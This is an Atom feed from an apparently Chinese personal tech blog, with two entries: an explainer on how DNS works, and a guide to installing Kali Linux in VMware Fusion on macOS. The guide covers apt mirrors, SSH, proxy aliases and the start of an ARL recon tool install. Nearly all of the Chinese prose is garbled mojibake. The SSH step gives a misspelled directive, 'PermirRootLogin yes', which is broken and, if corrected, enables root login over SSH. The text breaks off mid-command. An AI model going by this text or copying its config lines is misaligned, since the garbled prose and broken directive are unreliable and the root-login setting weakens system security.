<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yuuki&#39;s blog</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://blog.uuki.moe/atom.xml" rel="self"/>
  
  <link href="https://blog.uuki.moe/"/>
  <updated>2023-06-12T01:31:20.933Z</updated>
  <id>https://blog.uuki.moe/</id>
  
  <author>
    <name>yuuki</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>åŸŸåç³»ç»Ÿ (DNS) çš„å·¥ä½œåŸç†å’Œç›¸å…³ç¤ºä¾‹</title>
    <link href="https://blog.uuki.moe/2023/06/12/domain_name_server_works/"/>
    <id>https://blog.uuki.moe/2023/06/12/domain_name_server_works/</id>
    <published>2023-06-11T23:36:37.000Z</published>
    <updated>2023-06-12T01:31:20.933Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1ã€æ ¹åŸŸå-Root-Domain"><a href="#1ã€æ ¹åŸŸå-Root-Domain" class="headerlink" title="1ã€æ ¹åŸŸå (Root Domain)"></a>1ã€æ ¹åŸŸå (Root Domain)</h2><p>æ ¹åŸŸåæ˜¯äº’è”ç½‘åŸŸåç³»ç»Ÿ (DNS) ä¸­æœ€é«˜çº§åˆ«çš„åŸŸåã€‚å®ƒä½äºåŸŸåå±‚æ¬¡ç»“æ„çš„é¡¶éƒ¨, æ²¡æœ‰ä»»ä½•ä¸Šçº§åŸŸåã€‚æ ¹åŸŸååœ¨åŸŸåç³»ç»Ÿä¸­ä½¿ç”¨ä¸€ä¸ªç‚¹ (.) æ¥è¡¨ç¤º, å®ƒæ˜¯æ•´ä¸ªåŸŸåç³»ç»Ÿçš„èµ·ç‚¹ã€‚æ ¹åŸŸåç”± <a href="https://www.icann.org/">Internet Corporation for Assigned Names and Numbers (ICANN)</a> è¿›è¡Œç®¡ç†, å¹¶ç¡®ä¿å…¨çƒçš„æ ¹åŸŸåæœåŠ¡å™¨ä¹‹é—´çš„åŒæ­¥å’Œä¸€è‡´æ€§ã€‚</p><p>æ ¹åŸŸåæœåŠ¡å™¨ (Root Domain Server) ç”±ä¸€ç»„ç‹¬ç«‹çš„æœºæ„å’Œç»„ç»‡ç®¡ç†ã€‚è¿™äº›æœºæ„å’Œç»„ç»‡åˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ°, å¹¶æ ¹æ® ICANN çš„æŒ‡å¯¼æ“ä½œå’Œç»´æŠ¤æ ¹åŸŸåæœåŠ¡å™¨çš„å®ä¾‹ã€‚æˆªè‡³2019å¹´8æœˆï¼Œå…¨çƒå…±æœ‰1008å°æ ¹åŸŸåæœåŠ¡å™¨åœ¨è¿è¡Œã€‚</p><h2 id="2ã€é¡¶çº§åŸŸ-Top-Level-Domain"><a href="#2ã€é¡¶çº§åŸŸ-Top-Level-Domain" class="headerlink" title="2ã€é¡¶çº§åŸŸ (Top Level Domain)"></a>2ã€é¡¶çº§åŸŸ (Top Level Domain)</h2><p>é¡¶çº§åŸŸå (Top Level Domain, TLD) æ˜¯åŸŸåç³»ç»Ÿä¸­æœ€é«˜çº§åˆ«çš„åŸŸååˆ†ç±», å…¶ä½äºæ ¹åŸŸåä¹‹ä¸‹, å¯ä»¥å¯¹åŸŸåè¿›è¡Œåˆ†ç±»å’Œç»„ç»‡ã€‚é¡¶çº§åŸŸåé€šå¸¸æ˜¯ä¸€ä¸ªæ ‡è¯†æ€§çš„åŸŸååç¼€, ç”¨äºè¡¨ç¤ºä¸åŒçš„ç»„ç»‡ã€å›½å®¶æˆ–é¢†åŸŸã€‚ä¾‹å¦‚ <code>.com</code>, <code>.org</code>, <code>.net</code></p><p>ICANN å¹¶ä¸ä¼šç»Ÿä¸€ç®¡ç†æ‰€æœ‰çš„é¡¶çº§åŸŸ, è€Œæ˜¯äº¤ç”±ä¸åŒçš„é¡¶çº§åŸŸåæ‰˜ç®¡å•†ç®¡ç†, å¦‚ <code>.cn</code> åŸŸåå°±ç”±<a href="http://www.cnnic.net.cn/">ä¸­å›½äº’è”ç½‘ä¿¡æ¯ä¸­å¿ƒ</a> (CNNIC) æ¥ç»Ÿä¸€ç®¡ç†ã€‚å½“ç„¶ä¸€å®¶æ‰˜ç®¡å•†å¹¶ä¸æ˜¯åªèƒ½è´Ÿè´£ç®¡ç†ä¸€ä¸ªé¡¶çº§åŸŸ, Verisign å…¬å¸å°±æ‰˜ç®¡äº† <code>.com</code>, <code>.net</code>, <code>.name</code> ç­‰é¡¶çº§åŸŸåã€‚</p><h2 id="3ã€å­åŸŸå-Subdomain"><a href="#3ã€å­åŸŸå-Subdomain" class="headerlink" title="3ã€å­åŸŸå (Subdomain)"></a>3ã€å­åŸŸå (Subdomain)</h2><p>å­åŸŸåå°†é¡¶çº§åŸŸè¿›è¡Œäº†æ›´ç»†è‡´çš„åˆ’åˆ†, é¡¶çº§åŸŸåä¸‹æ˜¯äºŒçº§åŸŸ (Second-level Domain), ä¾‹å¦‚ <code>blog.uuki.moe</code> ä¸­çš„ <code>uuki</code>  å°±æ˜¯é¡¶çº§åŸŸ <code>moe</code> å­åŸŸåã€‚äºŒçº§åŸŸåä¸‹çš„æ˜¯ä¸‰çº§åŸŸå, å‰é¢ç¤ºä¾‹ä¸­çš„ <code>blog</code> å°±æ˜¯ <code>uuki.moe</code> çš„ä¸‰çº§åŸŸåã€‚</p><h2 id="4ã€æƒå¨åŸŸåæœåŠ¡å™¨"><a href="#4ã€æƒå¨åŸŸåæœåŠ¡å™¨" class="headerlink" title="4ã€æƒå¨åŸŸåæœåŠ¡å™¨"></a>4ã€æƒå¨åŸŸåæœåŠ¡å™¨</h2><p>æƒå¨åŸŸåæœåŠ¡å™¨ï¼ˆAuthoritative Name Serverï¼‰æ˜¯åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä¸­çš„ä¸€ç§æœåŠ¡å™¨ç±»å‹ï¼Œå®ƒå­˜å‚¨å’Œæä¾›ç‰¹å®šåŸŸåçš„DNSè®°å½•ä¿¡æ¯ã€‚å½“éœ€è¦æŸ¥è¯¢ç‰¹å®šåŸŸåçš„IPåœ°å€æˆ–å…¶ä»–DNSè®°å½•æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå‘æƒå¨åŸŸåæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»¥è·å–å‡†ç¡®çš„ä¿¡æ¯ã€‚</p><p>æƒå¨åŸŸåæœåŠ¡å™¨ç”±åŸŸåæ‰€æœ‰è€…æˆ–å…¶æˆæƒçš„ç®¡ç†è€…æ¥å»ºç«‹å’Œç®¡ç†ã€‚æ¯ä¸ªåŸŸåéƒ½å¿…é¡»æŒ‡å®šè‡³å°‘ä¸¤ä¸ªæƒå¨åŸŸåæœåŠ¡å™¨ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªä¸»æœåŠ¡å™¨å’Œä¸€ä¸ªå¤‡ä»½æœåŠ¡å™¨ã€‚è¿™äº›æœåŠ¡å™¨é€šå¸¸ç”±åŸŸåæ³¨å†Œå•†ã€æ‰˜ç®¡æä¾›å•†æˆ–ä¼ä¸šè‡ªå·±æ¥è¿è¡Œå’Œç®¡ç†ã€‚</p><h2 id="4ã€DNS-æŸ¥è¯¢å·¥ä½œåŸç†"><a href="#4ã€DNS-æŸ¥è¯¢å·¥ä½œåŸç†" class="headerlink" title="4ã€DNS æŸ¥è¯¢å·¥ä½œåŸç†"></a>4ã€DNS æŸ¥è¯¢å·¥ä½œåŸç†</h2><p>é‚£ä¹ˆå¼„æ¸…æ¥šäº†æ ¹åŸŸ (Root Domain)ã€é¡¶çº§åŸŸ (TLD)ã€å­åŸŸ (Subdomain)ã€æƒå¨åŸŸåæœåŠ¡å™¨ (Authoritative Name Server) çš„åŸºæœ¬æ¦‚å¿µå’Œå·¥ä½œåŸç†ä¹‹å, å½“ç”¨æˆ·åœ¨æµè§ˆå™¨è¾“å…¥åŸŸååœ°å€å¹¶è®¿é—®æ—¶å‘ç”Ÿäº†ä»€ä¹ˆ?</p><ol><li>ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥åŸŸååœ°å€ï¼ˆä¾‹å¦‚ï¼š<a href="http://www.example.com)./">www.example.comï¼‰ã€‚</a></li><li>æµè§ˆå™¨ä¼šé¦–å…ˆæ£€æŸ¥æœ¬åœ°ç¼“å­˜ï¼Œçœ‹æ˜¯å¦å·²ç»æœ‰è¯¥åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚å¦‚æœæœ‰ï¼Œå®ƒä¼šç›´æ¥ä½¿ç”¨è¯¥IPåœ°å€è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚</li><li>å¦‚æœæœ¬åœ°ç¼“å­˜æ²¡æœ‰è¯¥åŸŸåçš„IPåœ°å€ï¼Œæµè§ˆå™¨ä¼šå‘æ“ä½œç³»ç»Ÿå‘èµ·åŸŸåè§£æè¯·æ±‚ã€‚</li><li>æ“ä½œç³»ç»Ÿä¼šå‘æœ¬åœ°DNSè§£æå™¨å‘é€åŸŸåè§£æè¯·æ±‚ã€‚</li><li>æœ¬åœ°DNSè§£æå™¨é¦–å…ˆæŸ¥çœ‹è‡ªå·±çš„ç¼“å­˜ï¼Œå¦‚æœæœ‰è¯¥åŸŸåçš„è§£æç»“æœï¼Œå®ƒä¼šè¿”å›ç»™æ“ä½œç³»ç»Ÿã€‚</li><li>å¦‚æœæœ¬åœ°DNSè§£æå™¨çš„ç¼“å­˜ä¸­æ²¡æœ‰è¯¥åŸŸåçš„è§£æç»“æœï¼Œå®ƒä¼šå‘<strong>æ ¹åŸŸåæœåŠ¡å™¨</strong>å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚</li><li>æ ¹åŸŸåæœåŠ¡å™¨ä¼šå›å¤æœ¬åœ°DNSè§£æå™¨ï¼Œæä¾›<strong>é¡¶çº§åŸŸåæœåŠ¡å™¨</strong>çš„åœ°å€ã€‚</li><li>æœ¬åœ°DNSè§£æå™¨å†æ¬¡å‘<strong>é¡¶çº§åŸŸåæœåŠ¡å™¨</strong>å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚</li><li><strong>é¡¶çº§åŸŸåæœåŠ¡å™¨</strong> ä¼šå›å¤æœ¬åœ°DNSè§£æå™¨ï¼Œæä¾›<strong>æ¬¡çº§åŸŸåæœåŠ¡å™¨ (å­åŸŸå)</strong> çš„åœ°å€ã€‚</li><li>æœ¬åœ°DNSè§£æå™¨å‘<strong>æ¬¡çº§åŸŸåæœåŠ¡å™¨</strong>å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚</li><li>æ¬¡çº§åŸŸåæœåŠ¡å™¨ä¼šå›å¤æœ¬åœ°DNSè§£æå™¨ï¼Œæä¾›ä¸è¯¥åŸŸåç›¸å…³çš„<strong>æƒå¨åŸŸåæœåŠ¡å™¨</strong>çš„åœ°å€ã€‚</li><li>æœ¬åœ°DNSè§£æå™¨å‘<strong>æƒå¨åŸŸåæœåŠ¡å™¨</strong>å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚</li><li>æƒå¨åŸŸåæœåŠ¡å™¨æŸ¥æ‰¾å¹¶è¿”å›ä¸è¯¥åŸŸåç›¸å…³çš„IPåœ°å€ã€‚</li><li>æœ¬åœ°DNSè§£æå™¨å°†è·å–çš„IPåœ°å€è¿”å›ç»™æ“ä½œç³»ç»Ÿã€‚</li><li>æ“ä½œç³»ç»Ÿå°†IPåœ°å€è¿”å›ç»™æµè§ˆå™¨ã€‚</li><li>æµè§ˆå™¨ä½¿ç”¨è¯¥IPåœ°å€ä¸ç›®æ ‡æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚</li><li>æœåŠ¡å™¨æ¥æ”¶åˆ°æµè§ˆå™¨çš„è¯·æ±‚å¹¶è¿”å›ç›¸åº”çš„ç½‘é¡µå†…å®¹ã€‚</li><li>æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åï¼Œå°†ç½‘é¡µå†…å®¹æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚</li></ol><p>è¿™ä¸ªè¿‡ç¨‹æ¶‰åŠåˆ°åŸŸåè§£æã€DNSæŸ¥è¯¢ã€ç¼“å­˜æŸ¥æ‰¾å’Œä¸æœåŠ¡å™¨çš„é€šä¿¡ï¼Œæœ€ç»ˆå®ç°äº†å°†åŸŸåè½¬æ¢ä¸ºå¯¹åº”çš„IPåœ°å€ï¼Œå¹¶ä¸ç›®æ ‡æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œæ˜¾ç¤ºç½‘é¡µå†…å®¹ç»™ç”¨æˆ·ã€‚</p><h2 id="5ã€å¸¸è§çš„-DNS-è®°å½•"><a href="#5ã€å¸¸è§çš„-DNS-è®°å½•" class="headerlink" title="5ã€å¸¸è§çš„ DNS è®°å½•"></a>5ã€å¸¸è§çš„ DNS è®°å½•</h2><p>DNSï¼ˆDomain Name Systemï¼ŒåŸŸåç³»ç»Ÿï¼‰æ˜¯äº’è”ç½‘ä¸­ç”¨äºå°†åŸŸåè½¬æ¢ä¸ºå¯¹åº” IP åœ°å€çš„ç³»ç»Ÿã€‚DNS è®°å½•æ˜¯åœ¨ DNS æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„æ•°æ®é¡¹ï¼Œç”¨äºæŒ‡å®šç‰¹å®šåŸŸåçš„ä¸åŒé…ç½®ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ DNS è®°å½•ç±»å‹åŠå…¶ä½œç”¨ï¼š</p><ol><li><p>A è®°å½•ï¼ˆAddress Recordï¼‰ï¼šå°†åŸŸåè§£æä¸º IPv4 åœ°å€ã€‚å®ƒå°†åŸŸåæ˜ å°„åˆ°ä¸€ä¸ªæˆ–å¤šä¸ª IP åœ°å€ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡åŸŸåè®¿é—®ç½‘ç«™æˆ–å…¶ä»–ç½‘ç»œæœåŠ¡ã€‚</p></li><li><p>AAAA è®°å½•ï¼ˆIPv6 Address Recordï¼‰ï¼šç±»ä¼¼äº A è®°å½•ï¼Œä½†ç”¨äºå°†åŸŸåè§£æä¸º IPv6 åœ°å€ã€‚å®ƒå°†åŸŸåæ˜ å°„åˆ°ä¸€ä¸ªæˆ–å¤šä¸ª IPv6 åœ°å€ã€‚</p></li><li><p>CNAME è®°å½•ï¼ˆCanonical Name Recordï¼‰ï¼šç”¨äºåˆ›å»ºåˆ«åï¼Œå°†ä¸€ä¸ªåŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåã€‚å½“ä¸€ä¸ªåŸŸåæœ‰å¤šä¸ª CNAME è®°å½•æ—¶ï¼Œå®ƒä»¬æŒ‡å‘ç›¸åŒçš„ç›®æ ‡åŸŸåã€‚</p></li><li><p>MX è®°å½•ï¼ˆMail Exchanger Recordï¼‰ï¼šæŒ‡å®šæ¥æ”¶åŸŸåçš„ç”µå­é‚®ä»¶çš„é‚®ä»¶æœåŠ¡å™¨ã€‚å®ƒå°†åŸŸåæ˜ å°„åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªé‚®ä»¶æœåŠ¡å™¨çš„åœ°å€ï¼Œç¡®ä¿é‚®ä»¶èƒ½å¤Ÿæ­£ç¡®åœ°ä¼ é€’åˆ°ç›¸åº”çš„æœåŠ¡å™¨ã€‚</p></li><li><p>TXT è®°å½•ï¼ˆText Recordï¼‰ï¼šå…è®¸åŸŸåæ‰€æœ‰è€…å­˜å‚¨ä»»æ„æ–‡æœ¬ä¿¡æ¯ã€‚å®ƒé€šå¸¸ç”¨äºéªŒè¯åŸŸåæ‰€æœ‰æƒã€æä¾›å®‰å…¨ç›¸å…³çš„ä¿¡æ¯æˆ–è®°å½•å…¶ä»–æ–‡æœ¬æ•°æ®ã€‚</p></li><li><p>NS è®°å½•ï¼ˆName Server Recordï¼‰ï¼šæŒ‡å®šä¸€ä¸ªåŸŸåçš„æƒå¨ DNS æœåŠ¡å™¨ã€‚å®ƒå°†åŸŸåæ˜ å°„åˆ°å¤„ç†è¯¥åŸŸåçš„ DNS æœåŠ¡å™¨çš„åœ°å€ã€‚</p></li><li><p>SRV è®°å½•ï¼ˆService Recordï¼‰ï¼šç”¨äºæŒ‡å®šæä¾›ç‰¹å®šç½‘ç»œæœåŠ¡çš„æœåŠ¡å™¨çš„ä½ç½®å’Œç«¯å£å·ã€‚å®ƒç”¨äºè¯†åˆ«å’Œå®šä½ä¸åŒæœåŠ¡ï¼Œå¦‚ VoIPã€IMã€è‡ªåŠ¨é…ç½®ç­‰ã€‚</p></li><li><p>PTR è®°å½•ï¼ˆPointer Recordï¼‰ï¼šç”¨äºè¿›è¡Œåå‘ DNS æŸ¥è¯¢ï¼Œå°† IP åœ°å€è§£æä¸ºåŸŸåã€‚å®ƒä¸ A è®°å½•ç›¸åï¼Œé€šè¿‡ IP åœ°å€æŸ¥æ‰¾å¯¹åº”çš„åŸŸåã€‚</p></li></ol><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒDNS æœåŠ¡å™¨ç”±äº’è”ç½‘æœåŠ¡æä¾›å•†ï¼ˆISPï¼‰ã€ä¼ä¸šæˆ–ç»„ç»‡è‡ªå·±æ¥æ­å»ºå’Œç»´æŠ¤ã€‚å¤§å‹ä¼ä¸šå¯èƒ½ä¼šæœ‰è‡ªå·±çš„ç§æœ‰ DNS æœåŠ¡å™¨ï¼Œç”¨äºç®¡ç†å†…éƒ¨ç½‘ç»œå’ŒåŸŸåã€‚æ­¤å¤–ï¼Œè¿˜æœ‰è®¸å¤šå…¬å…± DNS æœåŠ¡æä¾›å•†ï¼Œå¦‚Google DNSã€Cloudflare DNSã€OpenDNS ç­‰ï¼Œå®ƒä»¬æä¾›äº†å…è´¹çš„å…¬å…± DNS æœåŠ¡å™¨ä¾›å¤§ä¼—ä½¿ç”¨ã€‚è¿™äº› DNS æœåŠ¡å™¨è´Ÿè´£è§£æç”¨æˆ·çš„ DNS æŸ¥è¯¢å¹¶è¿”å›ç›¸åº”çš„ IP åœ°å€æˆ–å…¶ä»–è®°å½•ä¿¡æ¯ã€‚</p><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ul><li><a href="https://www.ruanyifeng.com/blog/2018/05/root-domain.html">https://www.ruanyifeng.com/blog/2018/05/root-domain.html</a></li><li><a href="https://zh.wikipedia.org/wiki/%E6%A0%B9%E7%B6%B2%E5%9F%9F%E5%90%8D%E7%A8%B1%E4%BC%BA%E6%9C%8D%E5%99%A8">https://zh.wikipedia.org/wiki/æ ¹ç¶²åŸŸåç¨±ä¼ºæœå™¨</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%AD%90%E5%9F%9F%E5%90%8D">https://zh.wikipedia.org/wiki/å­åŸŸå</a></li><li><a href="https://www.sfn.cn/news/technology/detail/476.html?navId=22">https://www.sfn.cn/news/technology/detail/476.html?navId=22</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1ã€æ ¹åŸŸå-Root-Domain&quot;&gt;&lt;a href=&quot;#1ã€æ ¹åŸŸå-Root-Domain&quot; class=&quot;headerlink&quot; title=&quot;1ã€æ ¹åŸŸå (Root Domain)&quot;&gt;&lt;/a&gt;1ã€æ ¹åŸŸå (Root Domain)&lt;/h2&gt;&lt;p&gt;æ ¹åŸŸåæ˜¯äº’è”</summary>
      
    
    
    
    <category term="net" scheme="https://blog.uuki.moe/categories/net/"/>
    
    
    <category term="dns" scheme="https://blog.uuki.moe/tags/dns/"/>
    
  </entry>
  
  <entry>
    <title>MacOS ä¸‹ Kali Linux çš„å®‰è£…é…ç½®å’Œæ›´æ–°</title>
    <link href="https://blog.uuki.moe/2023/06/03/Install-kali-linux/"/>
    <id>https://blog.uuki.moe/2023/06/03/Install-kali-linux/</id>
    <published>2023-06-02T21:44:47.000Z</published>
    <updated>2023-06-11T23:48:47.654Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å„æ–‡ä»¶ä¸‹è½½åœ°å€</strong></p><ul><li>VMware Fusion ä¸‹è½½åœ°å€: <a href="https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal-13">https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal-13</a></li><li>é•œåƒä¸‹è½½åœ°å€: <a href="https://www.kali.org/get-kali/#kali-installer-images">https://www.kali.org/get-kali/#kali-installer-images</a></li><li>æ›´æ–° Kali Linux: <a href="https://www.kali.org/docs/general-use/updating-kali/">https://www.kali.org/docs/general-use/updating-kali/</a></li></ul><p><strong>ç¯å¢ƒè¯´æ˜</strong></p><ul><li>VMware Fusion ç‰ˆæœ¬: Player ç‰ˆæœ¬ 13.0.2 (21581413)</li><li>Kali Linux é•œåƒæ–‡ä»¶: kali-linux-2023.1-installer-arm64.iso </li><li>MacOS ç‰ˆæœ¬: Apple M1 Pro 13.3.1</li></ul><h3 id="VMware-Fusion-å®‰è£…-Kali-Linux"><a href="#VMware-Fusion-å®‰è£…-Kali-Linux" class="headerlink" title="VMware Fusion å®‰è£… Kali Linux"></a>VMware Fusion å®‰è£… Kali Linux</h3><ol><li>åœ¨ VMWare Fusion ä¸­é€‰æ‹© <code>Install disc or image</code> å®‰è£…ç³»ç»Ÿ</li><li>é…ç½®å‚æ•°æ ¸å¿ƒ <code>4</code> ä¸ª, å†…å­˜ <code>4096</code> MB, ç¡¬ç›˜ç©ºé—´ <code>30</code> G</li><li>å®‰è£…å®Œæˆåè®¾ç½® Kali Linux åˆ†è¾¨ç‡ä¸ MacOS ç›¸åŒ</li><li>åœ¨è®¾ç½®ä¸­æ‰“å¼€ <code>Kali HDMI Mode</code> (ç±»ä¼¼é«˜æ¸…ä¿®å¤çš„ä¸œè¥¿)</li><li>å°†å…‰æ ‡å¤§å°è®¾ç½®ä¸º 45</li></ol><h3 id="é…ç½®ä¸­å›½åœ°åŒº-apt-ä¸‹è½½æº"><a href="#é…ç½®ä¸­å›½åœ°åŒº-apt-ä¸‹è½½æº" class="headerlink" title="é…ç½®ä¸­å›½åœ°åŒº apt ä¸‹è½½æº"></a>é…ç½®ä¸­å›½åœ°åŒº apt ä¸‹è½½æº</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰“å¼€ sources.lists æºé…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨é‡Šæ‰å®˜æ–¹æºå, æ·»åŠ å¦‚ä¸‹å†…å®¹</span></span><br><span class="line">deb https://mirrors.ustc.edu.cn/debian/ bullseye main contrib non-free</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/debian/ bullseye main contrib non-free</span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–° apt æº</span></span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹ç”¨æˆ·ä¸»ç›®å½•è‹±æ–‡æ–‡ä»¶å¤¹"><a href="#ä¿®æ”¹ç”¨æˆ·ä¸»ç›®å½•è‹±æ–‡æ–‡ä»¶å¤¹" class="headerlink" title="ä¿®æ”¹ç”¨æˆ·ä¸»ç›®å½•è‹±æ–‡æ–‡ä»¶å¤¹"></a>ä¿®æ”¹ç”¨æˆ·ä¸»ç›®å½•è‹±æ–‡æ–‡ä»¶å¤¹</h3><ol><li>ç»ˆç«¯è¾“å…¥ <code>vim ~/.config/user-dirs.dirs</code> æ‰“å¼€é…ç½®æ–‡ä»¶, æŒ‰éœ€ä¿®æ”¹å³å¯ (ä¸‹æ–¹ä¸ºä¿®æ”¹åçš„å†…å®¹)</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XDG_DESKTOP_DIR=&quot;$HOME/Desktop&quot;</span><br><span class="line">XDG_DOWNLOAD_DIR=&quot;$HOME/Downloads&quot;</span><br><span class="line">XDG_TEMPLATES_DIR=&quot;$HOME/Templates&quot;</span><br><span class="line">XDG_PUBLICSHARE_DIR=&quot;$HOME/Public&quot;</span><br><span class="line">XDG_DOCUMENTS_DIR=&quot;$HOME/Documents&quot;</span><br><span class="line">XDG_MUSIC_DIR=&quot;$HOME/Music&quot;</span><br><span class="line">XDG_PICTURES_DIR=&quot;$HOME/Pictures&quot;</span><br><span class="line">XDG_VIDEOS_DIR=&quot;$HOME/Videos&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li>è¿›å…¥ç”¨æˆ·æ ¹ç›®å½•, ä¿®æ”¹æ–‡ä»¶åç§°ä¸ºå¯¹åº”çš„åç§°å, é‡å¯ç³»ç»Ÿå³å¯</li></ol><h3 id="SSH-è¿œç¨‹è¿æ¥é…ç½®"><a href="#SSH-è¿œç¨‹è¿æ¥é…ç½®" class="headerlink" title="SSH è¿œç¨‹è¿æ¥é…ç½®"></a>SSH è¿œç¨‹è¿æ¥é…ç½®</h3><p>åœ¨ <code>/etc/ssh/sshd_config</code> é…ç½®ä¸­æ–°å¢ä¸€è¡Œ <code>PermirRootLogin yes</code> å…è®¸ root ç™»å½• SSH</p><p>è®¾ç½® ssh æœåŠ¡å¼€æœºè‡ªå¯åŠ¨, å¹¶é‡å¯ ssh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> ssh</span><br><span class="line">systemctl restart ssh</span><br></pre></td></tr></table></figure><h3 id="é…ç½®å…±äº«æ–‡ä»¶å¤¹"><a href="#é…ç½®å…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="é…ç½®å…±äº«æ–‡ä»¶å¤¹"></a>é…ç½®å…±äº«æ–‡ä»¶å¤¹</h3><p>å¦‚å›¾é…ç½®å³å¯, çœŸæœºçš„ <code>kali</code> æ–‡ä»¶å¤¹å°†å‡ºç°åœ¨ Kali <code>/mnt/hgfs</code> ç›®å½•ä¸‹</p><p>å¦‚æœæ²¡æœ‰ VMware Tools å¯ä»¥å‚è€ƒ <a href="https://blog.csdn.net/weixin_35757704/article/details/119317373">é“¾æ¥</a> è¿›è¡Œé…ç½®, æ­£å¸¸æƒ…å†µä¸‹åœ¨è™šæ‹Ÿæœºå®‰è£…å®Œæˆåå°†ä¼šè‡ªåŠ¨å®‰è£… VMware Tools</p><p><img src="/../assets/Install-kali-linux/image-20230603_070210.png" class="lazyload" data-srcset="/../assets/Install-kali-linux/image-20230603_070210.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>ä¸ºäº†æ–¹ä¾¿, å°†å…±äº«ç›®å½•è½¯è¿æ¥åˆ°ç”¨æˆ·ä¸»ç›®å½•ä¸‹ (åç»­çš„ç¯å¢ƒä¹Ÿå°†ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹é¢è¿›è¡Œé…ç½®)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /mnt/hgfs/kali ~/kali</span><br></pre></td></tr></table></figure><h3 id="ç§‘å­¦ä¸Šç½‘ä»£ç†é…ç½®"><a href="#ç§‘å­¦ä¸Šç½‘ä»£ç†é…ç½®" class="headerlink" title="ç§‘å­¦ä¸Šç½‘ä»£ç†é…ç½®"></a>ç§‘å­¦ä¸Šç½‘ä»£ç†é…ç½®</h3><p>è¿™é‡ŒçœŸæœºä½¿ç”¨äº† <a href="https://github.com/yichengchen/clashX">Clash</a> æ­é…<a href="https://github.com/BoyceLig/Clash_Chinese_Patch/releases/tag/0.20.24">æ±‰åŒ–è¡¥ä¸</a>, å¼€å¯äº† 7890 çš„ socks5 ä»£ç†ç«¯å£ã€‚åœ¨ kali çš„ <code>~/.zshrc</code> å†…æ–°å¢å†…å®¹ (å°† 192.168.247.1 ä¿®æ”¹ä¸ºçœŸå®æœºå™¨ä¸ kali åœ¨åŒä¸€å±€åŸŸç½‘å†…çš„ IP åœ°å€) </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias pon=&quot;export https_proxy=http://192.168.247.1:7890 http_proxy=http://192.168.247.1:7890 all_proxy=socks5://192.168.247.1:7890&quot;</span><br><span class="line">alias poff=&quot;unset https_proxy; unset http_proxy; unset all_proxy&quot;</span><br></pre></td></tr></table></figure><p><img src="/../assets/Install-kali-linux/image-20230603_073719.png" class="lazyload" data-srcset="/../assets/Install-kali-linux/image-20230603_073719.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>ä¸‹é¢çš„éƒ¨åˆ†ç¯å¢ƒä¼šç”¨åˆ° docker, docker-composeã€‚å¦‚æœæ‹‰å–é•œåƒç¼“æ…¢, å¯ä»¥<a href="https://help.aliyun.com/document_detail/60750.html">å‚è€ƒé“¾æ¥</a>ä¼˜åŒ–é€Ÿåº¦ã€‚</p><h3 id="ARL-ç¯å¡”å®‰è£…é…ç½®"><a href="#ARL-ç¯å¡”å®‰è£…é…ç½®" class="headerlink" title="ARL ç¯å¡”å®‰è£…é…ç½®"></a>ARL ç¯å¡”å®‰è£…é…ç½®</h3><p>GitHub åœ°å€: <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> docker_arl</span><br><span class="line">wget -O docker_arl/docker.zip https://github.com/TophantTechnology/ARL/releases/download/v2.5.5/docker.zip</span><br><span class="line"><span class="built_in">cd</span> docker_arl</span><br><span 